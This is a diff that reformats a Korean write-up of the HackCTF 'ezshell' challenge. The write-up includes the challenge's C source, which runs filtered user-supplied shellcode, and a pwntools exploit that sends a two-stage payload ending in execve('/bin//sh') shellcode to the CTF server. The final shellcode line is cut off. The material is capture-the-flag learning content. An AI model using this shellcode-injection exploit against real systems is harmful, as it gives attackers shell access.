@@ -7,12 +7,6 @@ tags:   [HackCTF]
 categories: [Write-up]
 ---
 
-# [HackCTF] ezshell
-
-Date: Feb 03, 2020
-Tags: report
-
-
 ### 1.  문제
 
 ---
@@ -23,7 +17,7 @@ Tags: report
 
 Full RELRO와 카나리가 걸려있다. 또한 PIE도 걸려있는데 현재 RWX가 있는걸로 봐서 쉘코드 관련한 문제로 보인다.
 
-
+<br>
 
 **2) 문제 확인**
 
@@ -31,55 +25,57 @@ Full RELRO와 카나리가 걸려있다. 또한 PIE도 걸려있는데 현재 RW
 
 바이너리를 실행시키면 처음에 입력을 받고 어떠한 값이 출력된다. 
 
-
+<br>
 
 **3) 코드흐름 파악**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+    
+void Init(void)
+{
+    setvbuf(stdin, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stderr, 0, 2, 0);
+}
 
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-    #include <string.h>
-    	
-    void Init(void)
+int main(void)
+{
+    Init();
+
+    char result[100] = "\x0F\x05\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF";
+    char shellcode[30];
+    char filter[4] = {'\xb0', '\x3b', '\x0f', '\x05'};
+
+    read(0, shellcode, 30);
+    
+
+    for (int i = 0; i <= 3; i ++)
     {
-    	setvbuf(stdin, 0, 2, 0);
-    	setvbuf(stdout, 0, 2, 0);
-    	setvbuf(stderr, 0, 2, 0);
-    }
-    
-    int main(void)
-    {
-    	Init();
-    
-    	char result[100] = "\x0F\x05\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF";
-    	char shellcode[30];
-    	char filter[4] = {'\xb0', '\x3b', '\x0f', '\x05'};
-    
-    	read(0, shellcode, 30);
-    	
-    
-    	for (int i = 0; i <= 3; i ++)
-    	{
-    		if (strchr(shellcode, filter[i]))
-    		{
-    			puts("filtering :)");
-    			exit(1);
-    		}		
-    	}
-    
-    	for (int i = 0; i < 30; i++)
-    	{
-    		if (!shellcode[i])
-    		{
-    			puts("null :)");
-    			exit(1);
-    		}
-    	}
-    
-    	strcat(result, shellcode);
-    	(*(void (*)()) result + 2)();
+        if (strchr(shellcode, filter[i]))
+        {
+            puts("filtering :)");
+            exit(1);
+        }		
     }
 
+    for (int i = 0; i < 30; i++)
+    {
+        if (!shellcode[i])
+        {
+            puts("null :)");
+            exit(1);
+        }
+    }
+
+    strcat(result, shellcode);
+    (*(void (*)()) result + 2)();
+}
+```
+
+<br>
 이번 문제는 아예 코드를 줘버렸다. 코드의 흐름은 다음과 같다.
 
 
@@ -100,7 +96,7 @@ Full RELRO와 카나리가 걸려있다. 또한 PIE도 걸려있는데 현재 RW
 6. 만약 shellcode 배열이 필터에 걸리지 않고 널바이트가 없다면, result+2 즉 syscall 그다음을 호출한다.
 
 
-
+<br><br><br>
 
 
 ### 2. 접근방법
@@ -115,7 +111,7 @@ Full RELRO와 카나리가 걸려있다. 또한 PIE도 걸려있는데 현재 RW
 
 pwntools 의 asm기능을 이용하여 간단하게 구현하였다.
 
-
+<br><br>
 
 **시나리오**
 
@@ -146,10 +142,12 @@ pwntools 의 asm기능을 이용하여 간단하게 구현하였다.
 
     [jmp, call instruction 주소 계산](http://umbum.tistory.com/102)
 
+<br>
+
 사실 이렇게 syscall 위치의 상대주소를 구해도 실제 디버깅 해보면 틀리게 나온다. 따라서 직접 디버깅하면서 확인한 경과 위 공식?에서 +5를 해야지 실제 syscall 주소가 들어간다.
 
 
-
+<br><br><br>
 
 
 ### 3. 풀이
@@ -157,31 +155,31 @@ pwntools 의 asm기능을 이용하여 간단하게 구현하였다.
 ---
 
 최종 익스코드는 다음과 같다
+```python
+from pwn import *
+context.arch="amd64"
+context.log_level="DEBUG"
+p=remote("ctf.j0n9hyun.xyz",3036)
+#p=process("./ezshell")
+#gdb.attach(p,'code\nb *0xb92+$code\n')
 
-    from pwn import *
-    context.arch="amd64"
-    context.log_level="DEBUG"
-    p=remote("ctf.j0n9hyun.xyz",3036)
-    #p=process("./ezshell")
-    #gdb.attach(p,'code\nb *0xb92+$code\n')
-    
-    shell="mov rsp,QWORD PTR fs:[rbx];"
-    shell+="lea rsi,[rip-1];"
-    shell+="mov dx,0xffff;"
-    shell=asm(shell)
-    shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFBB+5), vma=0x1, arch='amd64',os='linux')
-    shell=shell.ljust(30,'\xcc')
-    log.info(len(shell))
-    log.info(shell)
-    p.send(shell)
-    shell2 = "\x90"*0x100
-    shell2 +="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x$
-    pause()
-    p.sendline(shell2)
-    p.interactive()
+shell="mov rsp,QWORD PTR fs:[rbx];"
+shell+="lea rsi,[rip-1];"
+shell+="mov dx,0xffff;"
+shell=asm(shell)
+shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFBB+5), vma=0x1, arch='amd64',os='linux')
+shell=shell.ljust(30,'\xcc')
+log.info(len(shell))
+log.info(shell)
+p.send(shell)
+shell2 = "\x90"*0x100
+shell2 +="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x$
+pause()
+p.sendline(shell2)
+p.interactive()
+```
 
-
-
+<br><br><br>
 
 
 ### 4. 몰랐던 개념
